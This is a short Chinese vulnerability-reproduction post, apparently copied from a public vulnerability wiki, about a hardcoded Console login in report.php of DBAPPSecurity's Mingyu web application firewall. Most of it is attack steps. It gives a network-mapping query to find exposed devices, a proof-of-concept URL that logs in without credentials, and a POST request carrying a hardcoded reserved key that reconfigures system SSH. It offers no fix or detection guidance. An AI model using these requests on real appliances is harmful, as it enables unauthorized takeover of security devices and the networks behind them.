---
title: "安恒 明御WEB应用防火墙 report.php 任意用户登录漏洞"
date: 2026-10-18 09:16:05
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "安恒"
tags:
  - "安恒"
  - "弱口令"
  - "漏洞复现"
---
## 漏洞描述

安恒 明御WEB应用防火墙 report.php文件存在硬编码设置的Console用户登录，攻击者可以通过漏洞直接登录后台

## 漏洞影响

```
安恒 明御WEB应用防火墙
```

## 网络测绘

```
app="安恒信息-明御WAF"
```

## 漏洞复现

登录页面

![image-20220824142132930](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241421007.png)

验证POC

```
/report.m?a=rpc-timed
```

![image-20220824142150382](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241421426.png)

再访问主页面跳转配置页面

![image-20220824142208002](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241422055.png)

发送请求包配置系统SSH等

```
POST /system.m?a=reserved
  
key=!@#dbapp-waf-dev-reserved#@!
```

![image-20220824142219609](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241422661.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1WEB%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md)
